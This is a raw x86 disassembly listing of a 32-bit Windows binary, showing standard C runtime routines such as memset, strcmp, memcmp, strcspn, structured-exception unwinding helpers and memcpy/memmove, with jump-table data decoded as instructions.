  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
